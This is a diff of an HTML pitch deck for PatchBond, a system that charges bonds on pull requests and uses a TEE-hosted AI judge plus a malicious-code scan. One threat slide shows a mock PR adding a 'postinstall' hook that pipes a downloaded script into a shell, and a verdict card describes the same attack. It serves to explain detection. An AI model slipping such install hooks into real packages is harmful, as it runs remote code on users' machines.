@@ -39,6 +39,7 @@
   .foot { position: absolute; left: 130px; right: 130px; bottom: 54px; display: flex; justify-content: space-between; font-size: 20px; color: var(--faint); z-index: 2; }
   .stat { font-size: 120px; font-weight: 800; letter-spacing: -.04em; line-height: 1; }
   .src { font-size: 19px; color: var(--faint); margin-top: 14px; }
+  .tight .pill { font-size: 19px; padding: 8px 16px; }
   .pill { display: inline-flex; align-items: center; gap: 12px; font-size: 24px; padding: 12px 22px; border: 1px solid var(--line); border-radius: 999px; background: var(--panel); color: var(--ink2); }
   table { border-collapse: collapse; width: 100%; font-size: 25px; }
   td { padding: 17px 10px; border-bottom: 1px solid var(--line); vertical-align: top; }
@@ -95,6 +96,19 @@
   <div class="foot"><span>Sources: docs/RESEARCH.md</span><span>3</span></div>
 </section>
 
+<!-- Threat -->
+<section class="slide" style="justify-content:center">
+  <div class="glow" style="top:120px;left:500px;background:rgba(248,113,113,.10)"></div>
+  <div class="eyebrow">The security problem</div>
+  <h1 style="margin-top:24px;max-width:1650px">Attacks don't break code. <span style="color:var(--danger)">They break tired maintainers.</span></h1>
+  <div class="row" style="margin-top:70px;align-items:stretch">
+    <div class="card grow"><h3 style="margin:0">The friendly pull request</h3><p>In 2024 a backdoor reached <b style="color:var(--ink)">xz-utils</b> — shipped in Linux distributions — after two years of “helpful” patches to an exhausted maintainer. Supply-chain attacks arrive as contributions.</p></div>
+    <div class="card grow mono" style="font-size:19px;line-height:1.8;background:#0a0c0e;white-space:nowrap;padding:36px 30px"><div class="f">✨ Fix typo in docs</div><div class="f">@friendly-dev · “happy to help!”</div><div class="m">- Teh queue runs jobs.</div><div class="m">+ The queue runs jobs.</div><div style="color:var(--danger)">+ "postinstall":<br>&nbsp;&nbsp;"curl …/p.sh | sh"</div></div>
+    <div class="card grow"><h3 style="margin:0">AI multiplies the volume</h3><p>When every PR costs an hour and there are hundreds, review gets rushed — exactly when a hidden payload slips through. PatchBond puts a price on the stranger's PR and a <b style="color:var(--ink)">deterministic malicious-code scan</b> in front of the model.</p></div>
+  </div>
+  <div class="foot"><span>Never run contributor code · read the repo's own CI · scan every added line</span><span>4</span></div>
+</section>
+
 <!-- 4. The idea -->
 <section class="slide" style="justify-content:center">
   <div class="glow" style="top:100px;left:-200px"></div>
@@ -106,7 +120,7 @@
     <div class="card grow"><span class="tag">3 · Settle</span><h3>Refund — or the repo is paid</h3><p>Real work: every cent back. Slop: 90% to the repo's vault.</p></div>
   </div>
   <p style="font-size:28px;color:var(--ink2);margin-top:50px">The opposite of tea.xyz: spam <b style="color:var(--ink)">costs</b> money instead of earning it. No token. Nobody is paid for submitting.</p>
-  <div class="foot"><span>PatchBond</span><span>4</span></div>
+  <div class="foot"><span>PatchBond</span><span>5</span></div>
 </section>
 
 <!-- 5. Product -->
@@ -120,7 +134,7 @@
     </div>
     <img class="shot" src="../media/pay.png" style="width:1040px">
   </div>
-  <div class="foot"><span>Real app · NEAR testnet</span><span>5</span></div>
+  <div class="foot"><span>Real app · NEAR testnet</span><span>6</span></div>
 </section>
 
 <!-- 6. Attention pricing -->
@@ -136,7 +150,7 @@
       <div class="card" style="padding:30px"><span class="tag" style="color:var(--danger);background:rgba(248,113,113,.12)">Spam wave</span><p style="margin-top:14px">40 open → <b style="color:var(--ink)">$50 ceiling</b></p></div>
     </div>
   </div>
-  <div class="foot"><span class="mono">bond = clamp(min, max, base × 1.125^(open − capacity)) × reputation</span><span>6</span></div>
+  <div class="foot"><span class="mono">bond = clamp(min, max, base × 1.125^(open − capacity)) × reputation</span><span>7</span></div>
 </section>
 
 <!-- 7. The judge -->
@@ -157,7 +171,29 @@
     </div>
     <img class="shot" src="../media/verdict.png" style="width:900px;height:760px;object-fit:cover;object-position:top">
   </div>
-  <div class="foot"><span>Live: z-ai/glm-5.3-flash in a TEE · 0/15 good PRs forfeited · 14/15 refunded automatically · $0.00035 a verdict</span><span>7</span></div>
+  <div class="foot"><span>Live: z-ai/glm-5.3-flash in a TEE · 0/15 good PRs forfeited · 14/15 refunded automatically · $0.00035 a verdict</span><span>8</span></div>
+</section>
+
+<!-- Judge quality -->
+<section class="slide">
+  <div class="eyebrow">Judge quality</div>
+  <h2>Built for precision: <span class="g">it never took an honest contributor's money.</span></h2>
+  <div class="row" style="margin-top:56px;align-items:stretch">
+    <div class="card" style="width:820px">
+      <span class="tag">NEAR's own core repo · near/nearcore</span>
+      <div class="row" style="margin-top:26px;gap:50px">
+        <div><div class="stat num">186</div><p>open PRs</p></div>
+        <div><div class="stat num">20</div><p>from strangers, judged</p></div>
+        <div><div class="stat num g">0</div><p>honest PRs forfeited</p></div>
+      </div>
+      <p>13 refunded automatically · 7 to a maintainer · <b style="color:var(--ink)">$0.0074 for all 20</b>, every verdict TEE-signed. Real fixes there wait a median <b style="color:var(--ink)">236 days</b> for review — signed triage helps even without spam.</p>
+    </div>
+    <div class="grow" style="display:flex;flex-direction:column;gap:28px">
+      <div class="card"><div class="stat num g" style="font-size:96px">0 / 35</div><p>genuine contributions forfeited across the labelled set and nearcore. Spam is stopped first by the bond itself; the judge only has to be right about who gets their money back.</p></div>
+      <div class="card" style="border-color:rgba(248,113,113,.45)"><span class="tag" style="color:var(--danger);background:rgba(248,113,113,.12)">Forfeit · 0.99 · signed by NEAR AI</span><p style="font-style:italic;color:var(--ink)">“Adds a postinstall hook that pipes a remote script into a shell… none of the claimed work: no tests, no src/queue.ts change.”</p><p style="font-size:20px">The contract accepts this signature on-chain — <span class="mono" style="font-size:19px">bun run demo</span></p></div>
+    </div>
+  </div>
+  <div class="foot"><span>docs/eval · signed records verifiable offline: bun scripts/verify-record.ts</span><span>9</span></div>
 </section>
 
 <!-- 8. Verify it yourself -->
@@ -171,7 +207,24 @@
     <div class="card grow"><h3 class="mono" style="font-size:28px;margin:0">signer ✓</h3><p>The enclave's key, recovered from the signature (EIP-191).</p></div>
     <div class="card grow" style="border-color:rgba(34,197,94,.45)"><h3 class="mono g" style="font-size:28px;margin:0">contract ✓</h3><p>The contract itself recovers NEAR AI's signature (ecrecover). <b style="color:var(--ink)">No forfeit without it</b> — not even from our own server.</p></div>
   </div>
-  <div class="foot"><span>shared/src/verify.ts in the browser · contract/vault/src/tee.rs on-chain · keys from NEAR AI's attestation report</span><span>8</span></div>
+  <div class="foot"><span>shared/src/verify.ts in the browser · contract/vault/src/tee.rs on-chain · keys from NEAR AI's attestation report</span><span>10</span></div>
+</section>
+
+<!-- OutLayer -->
+<section class="slide">
+  <div class="eyebrow">OutLayer · Intel TDX · live on testnet</div>
+  <h2>Our server leaves the loop.</h2>
+  <p class="lead">A server that builds the prompt could feed the model fake facts. So the contract can have the PR judged inside an <b style="color:var(--ink)">OutLayer enclave</b> instead — no PatchBond server in the path.</p>
+  <div class="row" style="margin-top:56px;align-items:stretch">
+    <div class="card grow"><span class="tag">1 · Anyone asks</span><h3>judge_in_tee(repo, pr)</h3><p>The contract writes the input itself — and pins the program's exact wasm hash.</p></div>
+    <div class="card grow"><span class="tag">2 · In the enclave</span><h3>Reads GitHub, asks NEAR AI</h3><p>Same facts, prompt and rules as the server — <b style="color:var(--ink)">byte-identical</b> on 30 real PRs (parity test).</p></div>
+    <div class="card grow" style="border-color:rgba(34,197,94,.45)"><span class="tag">3 · The contract checks</span><h3>ecrecover → NEAR AI's key</h3><p>Then settles. With <span class="mono" style="font-size:22px">exclusive</span> on, our oracle can't forfeit anything at all.</p></div>
+  </div>
+  <div class="card mono" style="margin-top:36px;padding:26px 34px;font-size:22px;line-height:1.7;color:var(--ink2);background:#0a0c0e">
+    <div><span class="g">✓</span> tx GTZM613J… · OutLayer ran our pinned wasm in <b style="color:var(--ink)">24.5 s</b> · 0.0036 NEAR</div>
+    <div><span class="g">✓</span> tee_verified · signer 0x3b75…fa0c (NEAR AI GLM enclave) · verdict hash computed on-chain</div>
+  </div>
+  <div class="foot"><span>outlayer/judge · contract/vault/src/outlayer.rs · docs/OUTLAYER.md</span><span>11</span></div>
 </section>
 
 <!-- 9. Fair to both sides -->
@@ -183,7 +236,7 @@
     <div class="card grow"><span class="tag" style="color:var(--danger);background:rgba(248,113,113,.12)">Attacks caught</span><h3>Malicious code forfeits automatically</h3><p>A deterministic scan — not the model's mood — finds Trojan-Source Unicode, hidden payloads, install-time downloads and poisoned CI. Still challengeable. Zero false hits on 30 real PRs.</p></div>
     <div class="card grow"><span class="tag" style="color:var(--warn);background:rgba(251,191,36,.12)">Attention kept</span><h3>Unpaid PRs cost nothing to ignore</h3><p>Labelled <span class="mono" style="font-size:22px">deposit paid</span> / <span class="mono" style="font-size:22px">awaiting</span>, closed after an announced 24 h, reopened the moment they pay.</p></div>
   </div>
-  <div class="foot"><span>contract/vault/tests/maintainer_safeguards.rs · server/src/judge/malice.ts</span><span>9</span></div>
+  <div class="foot"><span>contract/vault/tests/maintainer_safeguards.rs · server/src/judge/malice.ts</span><span>12</span></div>
 </section>
 
 <!-- 10. The edges -->
@@ -196,7 +249,7 @@
     <div class="card"><span class="tag">Slop funds the fix</span><h3>Spam pays whoever really fixes the issue</h3><p>A forfeited PR that claimed to fix #N becomes a bounty on #N, paid when a real fix is merged.</p></div>
     <div class="card"><span class="tag">Agent passports</span><h3>Capped wallets for coding agents</h3><p>A function-call key that can only pay bonds, a daily cap enforced by the contract, a public record per harness.</p></div>
   </div>
-  <div class="foot"><span>contract/vault/src</span><span>10</span></div>
+  <div class="foot"><span>contract/vault/src</span><span>13</span></div>
 </section>
 
 <!-- 11. Money flow -->
@@ -225,7 +278,7 @@
     <text x="1050" y="442" fill="#eceae4" font-weight="700" font-size="30">Maintainer withdraws</text>
     <text x="1050" y="482" fill="#a3a6ad">to NEAR · any chain via Intents · a DAO</text>
   </svg>
-  <div class="foot"><span>Only the repo's linked payout account can withdraw — not the owner, not the oracle</span><span>11</span></div>
+  <div class="foot"><span>Only the repo's linked payout account can withdraw — not the owner, not the oracle</span><span>14</span></div>
 </section>
 
 <!-- 12. Agents -->
@@ -248,15 +301,16 @@
       </div>
     </div>
   </div>
-  <div class="foot"><span>mcp/ · 7 tools · paid a real bond on testnet in our e2e</span><span>12</span></div>
+  <div class="foot"><span>mcp/ · 7 tools · paid a real bond on testnet in our e2e</span><span>15</span></div>
 </section>
 
 <!-- 13. NEAR -->
 <section class="slide">
   <div class="eyebrow">Built on NEAR</div>
   <h2>Every piece is a NEAR primitive.</h2>
-  <table style="margin-top:50px;font-size:28px">
+  <table style="margin-top:40px;font-size:26px">
     <tr><td>NEAR AI Cloud</td><td>Live verifiable inference in a TEE (GLM-5.3-flash, Kimi K3); signatures checked in the browser <b style="color:var(--ink)">and by the contract</b></td></tr>
+    <tr><td>OutLayer (Intel TDX)</td><td>The judge as a wasm program in an enclave, called by the contract (yield/resume); the callback checks NEAR AI's signature</td></tr>
     <tr><td>Rust contract + NEP-297</td><td>Bonds, curve, verdicts, challenges, vaults, budgets, reputation</td></tr>
     <tr><td>NEP-141 USDC & wNEAR</td><td>Bonds in USDC or NEAR — NEAR wrapped and paid in one signed transaction</td></tr>
     <tr><td>Function-call keys</td><td>Capped agent wallets that can only pay bonds</td></tr>
@@ -265,7 +319,7 @@
     <tr><td>NEAR Intents 1Click</td><td>Maintainers get paid on Base, Arbitrum, Ethereum or Solana</td></tr>
     <tr><td>Sputnik DAO / Trezu</td><td>Hand a repo's vault to a project treasury</td></tr>
   </table>
-  <div class="foot"><span>Paths to each in the README</span><span>13</span></div>
+  <div class="foot"><span>Paths to each in the README</span><span>16</span></div>
 </section>
 
 <!-- 14. Proof -->
@@ -274,16 +328,16 @@
   <h2>Built, tested, and live.</h2>
   <div class="row" style="margin-top:46px">
     <div class="card grow"><div class="stat num g">62</div><p>real testnet transactions in one end-to-end run — every money path, gasless USDC, NEAR via the real wrap.testnet, an agent via MCP. All passed.</p></div>
-    <div class="card grow"><div class="stat num">152</div><p>automated tests: 53 contract (incl. a 50,000-case money property test, real NEAR AI signatures verified on-chain, live-state upgrades), 99 TypeScript.</p></div>
-    <div class="card grow"><div class="stat num">0/15</div><p>good PRs forfeited by the <b style="color:var(--ink)">live TEE judge</b> on 30 real PRs. $0.00035 a verdict.</p></div>
+    <div class="card grow"><div class="stat num">158</div><p>automated tests: 54 contract (incl. a 50,000-case money property test, genuine NEAR AI signatures verified on-chain, the OutLayer callback), 102 TypeScript, and byte-parity of the enclave judge on 30 real PRs.</p></div>
+    <div class="card grow"><div class="stat num">0/35</div><p>genuine PRs forfeited by the <b style="color:var(--ink)">live TEE judge</b> — the labelled set plus nearcore's open queue. $0.00035 a verdict.</p></div>
   </div>
-  <div class="row" style="margin-top:44px;flex-wrap:wrap;gap:14px">
-    <span class="pill">✓ curve on-chain = curve in the app</span><span class="pill">✓ refund · 90/10 forfeit · void</span><span class="pill">✓ review tip earned / returned</span>
+  <div class="row tight" style="margin-top:34px;flex-wrap:wrap;gap:10px">
+    <span class="pill">✓ curve on-chain = curve in the app</span><span class="pill">✓ refund · 90/10 forfeit · void</span>
     <span class="pill">✓ slop funds the fix</span><span class="pill">✓ challenge won after a real window</span><span class="pill">✓ gasless bond: 0 NEAR spent</span>
-    <span class="pill">✓ agent key can't escape its cap</span><span class="pill">✓ no USDC created or lost</span>
-    <span class="pill">✓ NEAR bond: wrap + pay in one tx</span><span class="pill">✓ a maintainer can't keep a bond alone</span><span class="pill">✓ live PR on a 122-contributor repo, judged in a TEE</span><span class="pill">✓ a stolen oracle key can't redirect a vault — or fake a forfeit</span>
+    <span class="pill">✓ agent key can't escape its cap</span>
+    <span class="pill">✓ NEAR bond: wrap + pay in one tx</span><span class="pill">✓ a maintainer can't keep a bond alone</span><span class="pill">✓ live PR on a 122-contributor repo, judged in a TEE</span><span class="pill">✓ a stolen oracle key can't redirect a vault — or fake a forfeit</span><span class="pill">✓ judged inside OutLayer TDX on testnet</span><span class="pill">✓ <span class="mono" style="font-size:18px">bun run demo</span>: clone → refund &amp; forfeit, one command</span>
   </div>
-  <div class="foot"><span>docs/e2e/testnet-report.md — one explorer link per tx · threat model in SECURITY.md</span><span>14</span></div>
+  <div class="foot"><span>docs/e2e/testnet-report.md — one explorer link per tx · threat model in SECURITY.md</span><span>17</span></div>
 </section>
 
 <!-- 15. Ask -->
@@ -292,7 +346,7 @@
   <img src="../../brand/patchbond-mark-transparent.svg" alt="" style="width:150px">
   <h1 style="margin-top:44px;max-width:1500px">Make your repo's attention <span class="g">worth something.</span></h1>
   <div class="row" style="margin-top:64px">
-    <div class="card grow"><h3 style="margin:0">Maintainers</h3><p>Install the GitHub App on one repo. Pilot with us — we'll tune the judge on your real PRs.</p></div>
+    <div class="card grow"><h3 style="margin:0">Maintainers</h3><p>Try it on one repo in 10 minutes — <span class="mono" style="font-size:21px">docs/MAINTAINERS.md</span>. Your team never pays; we tune the judge on your real PRs.</p></div>
     <div class="card grow"><h3 style="margin:0">Agent builders</h3><p>Plug in the MCP server. Give your agent a wallet that can't hurt you.</p></div>
     <div class="card grow"><h3 style="margin:0">NEAR</h3><p>Verifiable AI deciding where real money goes — in public, for open source.</p></div>
   </div>
